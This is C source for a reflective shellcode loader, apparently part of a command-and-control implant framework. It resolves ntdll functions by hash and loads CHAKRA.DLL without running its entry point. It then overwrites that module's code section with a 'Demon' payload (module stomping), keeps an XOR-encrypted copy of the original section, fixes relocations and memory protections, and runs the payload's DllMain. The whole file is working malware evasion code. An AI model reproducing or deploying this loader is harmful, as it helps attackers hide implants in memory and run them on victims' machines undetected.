#include <Core.h>
#include <Win32.h>
#include <ntdef.h>
#include <Utils.h>
#ifdef _WIN64
#define IMAGE_REL_TYPE IMAGE_REL_BASED_DIR64
#else
#define IMAGE_REL_TYPE IMAGE_REL_BASED_HIGHLOW
#endif
#define KEYSIZE 4
SEC( text, B ) VOID Entry( VOID )
{
    INSTANCE                Instance        = { 0 };
    HMODULE                 KaynLibraryLdr  = NULL;
    PIMAGE_NT_HEADERS       NtHeaders       = NULL;
    PIMAGE_SECTION_HEADER   SecHeader       = NULL;
    LPVOID                  KVirtualMemory  = NULL;
    PFULLLDR_DATA_TABLE_ENTRY   StompedEntry    = NULL;
    SIZE_T                   KMemSize        = 0;
    SIZE_T                   KHdrSize        = 0;
    PVOID                   SecMemory       = NULL;
    SIZE_T                   SecMemorySize   = 0;
    DWORD                   Protection      = 0;
    ULONG Characteristics = 0x2;
    ULONG                   OldProtection   = 0;
    PIMAGE_DATA_DIRECTORY   ImageDir        = NULL;
    KAYN_ARGS               KaynArgs        = { 0 };
    PVOID                   ModuleStomped   = NULL;
    PVOID                   StompedAddress = NULL;
    SIZE_T                   StompedSize = 0;
    U_STRING UnicodeString  = { 0 };
    PBYTE DestPtr = NULL;
    PBYTE SrcPtr = NULL;
    WCHAR          NameW[ 260 ]   = { 0 };
    USHORT         DestSize       = 0;
    BYTE key[KEYSIZE] = {0x9f,0x8b,0xa,0xac};
    CHAR ModuleName[ 11 ] = { 0 };
    ModuleName[ 0  ] = 'C';
    ModuleName[ 1  ] = 'H';
    ModuleName[ 2  ] = 'A';
    ModuleName[ 3  ] = 'K';
    ModuleName[ 4  ] = 'R';
    ModuleName[ 5  ] = 'A';
    ModuleName[ 6  ] = '.';
    ModuleName[ 7  ] = 'D';
    ModuleName[ 8  ] = 'L';
    ModuleName[ 9  ] = 'L';
    ModuleName[ 10  ] = '\0';

     // 0. First we need to get our own image base
    KaynLibraryLdr          = KaynCaller();
    Instance.Modules.Ntdll  = LdrModulePeb( NTDLL_HASH );

    Instance.Win32.LdrLoadDll              = LdrFunctionAddr( Instance.Modules.Ntdll, SYS_LDRLOADDLL );
    Instance.Win32.NtAllocateVirtualMemory = LdrFunctionAddr( Instance.Modules.Ntdll, SYS_NTALLOCATEVIRTUALMEMORY );
    Instance.Win32.NtProtectVirtualMemory  = LdrFunctionAddr( Instance.Modules.Ntdll, SYS_NTPROTECTEDVIRTUALMEMORY );

    /* convert module ansi string to unicode string */
    CharStringToWCharString( NameW, ModuleName, StringLengthA( ModuleName ) );
    ModuleStomped = (PVOID)LdrModulePeb(STOMPED_HASH);
    if(!NT_SUCCESS(ModuleStomped)) {
        /* get size of module unicode string */
        DestSize = StringLengthW(NameW) * sizeof(WCHAR);
        UnicodeString.Buffer = NameW;
        UnicodeString.Length = DestSize;
        UnicodeString.MaximumLength = DestSize + sizeof( WCHAR );
        ModuleStomped = 0;
        //Characteristics set to 2 in order to not call entrypoint and load as EXE
        if (NT_SUCCESS(Instance.Win32.LdrLoadDll(NULL, &Characteristics, &UnicodeString, &ModuleStomped)) &&
            ModuleStomped != 0) {
            StompedEntry = LdrModulePebDTE(STOMPED_HASH);
#ifdef _WIN64
            *(PULONG)((PBYTE)StompedEntry + 0x68) = 0xca2cc; //sets StompedEntry->DontCallForThreads = 1; StompedEntry->Flags = 0xca2cc -> this instruction got translated to rax+0x5c don't know why
            //StompedEntry->Flags = 0xca2cc; //sets StompedEntry->DontCallForThreads = 1
#else
            *(PULONG)((PBYTE)StompedEntry + 0x34) = 0xca2cc; //sets StompedEntry->DontCallForThreads = 1;
#endif
            NtHeaders = C_PTR(ModuleStomped + ((PIMAGE_DOS_HEADER) ModuleStomped)->e_lfanew);
            SecHeader = IMAGE_FIRST_SECTION(NtHeaders);
            for (DWORD i = 0; i < NtHeaders->FileHeader.NumberOfSections; i++) {
                //SecMemory = C_PTR( ModuleStomped + SecHeader[ i ].VirtualAddress );
                if (IsText(&SecHeader[i])) {
                    KVirtualMemory = C_PTR(ModuleStomped + SecHeader[i].VirtualAddress);
                    SecMemorySize = SecHeader[i].SizeOfRawData;
                    StompedSize = SecMemorySize;
                    break;
                }
            }
        }
    }else{
        NtHeaders = C_PTR(ModuleStomped + ((PIMAGE_DOS_HEADER) ModuleStomped)->e_lfanew);
        SecHeader = IMAGE_FIRST_SECTION(NtHeaders);
        for (DWORD i = 0; i < NtHeaders->FileHeader.NumberOfSections; i++) {
            //SecMemory = C_PTR( ModuleStomped + SecHeader[ i ].VirtualAddress );
            if (IsText(&SecHeader[i])) {
                KVirtualMemory = C_PTR(ModuleStomped + SecHeader[i].VirtualAddress);
                SecMemorySize = SecHeader[i].SizeOfRawData;
                StompedSize = SecMemorySize;
                break;
            }
        }
    }
    //allocating RW region for stomped text section
    if(NT_SUCCESS(Instance.Win32.NtAllocateVirtualMemory( NtCurrentProcess(), &StompedAddress, 0, &StompedSize, MEM_COMMIT, PAGE_READWRITE ) )){
        //Copy stomped module text section to other location
        DestPtr = StompedAddress;
        SrcPtr = KVirtualMemory;
        if(KVirtualMemory != 0 && StompedAddress != 0 && StompedSize > 0) {
            for (int i = 0; i < StompedSize; i++) {
                DestPtr[i] = SrcPtr[i];
            }
            XOREncrypt(StompedAddress, StompedSize, key, KEYSIZE);
            KaynArgs.StompedAddress = StompedAddress;
            KaynArgs.StompedSize = StompedSize;
        }
    }

    NtHeaders = C_PTR( KaynLibraryLdr + ( ( PIMAGE_DOS_HEADER ) KaynLibraryLdr )->e_lfanew );
    SecHeader = IMAGE_FIRST_SECTION( NtHeaders );
    KHdrSize  = SecHeader[ 0 ].VirtualAddress;
    KMemSize  = NtHeaders->OptionalHeader.SizeOfImage - KHdrSize;
    Protection = PAGE_READWRITE;

    if ( (KVirtualMemory != NULL &&  NT_SUCCESS(Instance.Win32.NtProtectVirtualMemory( NtCurrentProcess(), &KVirtualMemory, &KMemSize, Protection, &OldProtection )) )|| NT_SUCCESS( Instance.Win32.NtAllocateVirtualMemory( NtCurrentProcess(), &KVirtualMemory, 0, &KMemSize, MEM_COMMIT, PAGE_READWRITE ) ) )
    {
        // TODO: find the base address of this shellcode in a better way?
        KaynArgs.KaynLdr   = ( PVOID ) ( ( ( ULONG_PTR )KaynLibraryLdr ) & ( ~ ( PAGE_SIZE - 1 ) ) );
        KaynArgs.DllCopy   = KaynLibraryLdr;
        KaynArgs.Demon     = KVirtualMemory;
        KaynArgs.DemonSize = KMemSize;

        for ( DWORD i = 0; i < NtHeaders->FileHeader.NumberOfSections; i++ )
        {
            MemCopy(
                C_PTR( KVirtualMemory + SecHeader[ i ].VirtualAddress - KHdrSize ), // Section New Memory
                C_PTR( KaynLibraryLdr + SecHeader[ i ].PointerToRawData ),          // Section Raw Data
                SecHeader[ i ].SizeOfRawData                                        // Section Size
            );
        }
        ImageDir = & NtHeaders->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_BASERELOC ];
        if ( ImageDir->VirtualAddress )
            KaynLdrReloc( KVirtualMemory, (PVOID)NtHeaders->OptionalHeader.ImageBase, C_PTR( KVirtualMemory + ImageDir->VirtualAddress ), KHdrSize );

        for ( DWORD i = 0; i < NtHeaders->FileHeader.NumberOfSections; i++ )
        {
            SecMemory       = C_PTR( KVirtualMemory + SecHeader[ i ].VirtualAddress - KHdrSize );
            SecMemorySize   = SecHeader[ i ].SizeOfRawData;
            Protection      = 0;
            OldProtection   = 0;

            if ( SecHeader[ i ].Characteristics & IMAGE_SCN_MEM_WRITE )
                Protection = PAGE_WRITECOPY;

            if ( SecHeader[ i ].Characteristics & IMAGE_SCN_MEM_READ )
                Protection = PAGE_READONLY;

            if ( ( SecHeader[ i ].Characteristics & IMAGE_SCN_MEM_WRITE ) && ( SecHeader[ i ].Characteristics & IMAGE_SCN_MEM_READ ) )
                Protection = PAGE_READWRITE;

            if ( SecHeader[ i ].Characteristics & IMAGE_SCN_MEM_EXECUTE )
                Protection = PAGE_EXECUTE;

            if ( ( SecHeader[ i ].Characteristics & IMAGE_SCN_MEM_EXECUTE ) && ( SecHeader[ i ].Characteristics & IMAGE_SCN_MEM_WRITE ) )
                Protection = PAGE_EXECUTE_WRITECOPY;

            if ( ( SecHeader[ i ].Characteristics & IMAGE_SCN_MEM_EXECUTE ) && ( SecHeader[ i ].Characteristics & IMAGE_SCN_MEM_READ ) )
            {
                Protection = PAGE_EXECUTE_READ;
                KaynArgs.TxtBase = KVirtualMemory + SecHeader[ i ].VirtualAddress - KHdrSize;
                KaynArgs.TxtSize = SecHeader[ i ].SizeOfRawData;
            }

            if ( ( SecHeader[ i ].Characteristics & IMAGE_SCN_MEM_EXECUTE ) && ( SecHeader[ i ].Characteristics & IMAGE_SCN_MEM_WRITE ) && ( SecHeader[ i ].Characteristics & IMAGE_SCN_MEM_READ ) )
                Protection = PAGE_EXECUTE_READWRITE;

            Instance.Win32.NtProtectVirtualMemory( NtCurrentProcess(), &SecMemory, &SecMemorySize, Protection, &OldProtection );
        }

        // --------------------------------
        // 6. Finally executing our DllMain
        // --------------------------------
        BOOL ( WINAPI *KaynDllMain ) ( PVOID, DWORD, PVOID ) = C_PTR( KVirtualMemory + NtHeaders->OptionalHeader.AddressOfEntryPoint - KHdrSize );
        KaynDllMain( KVirtualMemory, DLL_PROCESS_ATTACH, &KaynArgs );
    }
}

VOID KaynLdrReloc( PVOID KaynImage, PVOID ImageBase, PVOID BaseRelocDir, DWORD KHdrSize )
{
    PIMAGE_BASE_RELOCATION  pImageBR = C_PTR( BaseRelocDir - KHdrSize );
    LPVOID                  OffsetIB = C_PTR( U_PTR( KaynImage - KHdrSize ) - U_PTR( ImageBase ) );
    PIMAGE_RELOC            Reloc    = NULL;

    while( pImageBR->VirtualAddress != 0 )
    {
        Reloc = ( PIMAGE_RELOC ) ( pImageBR + 1 );

        while ( ( PBYTE ) Reloc != ( PBYTE ) pImageBR + pImageBR->SizeOfBlock )
        {
            if ( Reloc->type == IMAGE_REL_TYPE )
                *( ULONG_PTR* ) ( U_PTR( KaynImage ) + pImageBR->VirtualAddress + Reloc->offset - KHdrSize ) += ( ULONG_PTR ) OffsetIB;

            else if ( Reloc->type != IMAGE_REL_BASED_ABSOLUTE )
                __debugbreak(); // TODO: handle this error

            Reloc++;
        }

        pImageBR = ( PIMAGE_BASE_RELOCATION ) Reloc;
    }
}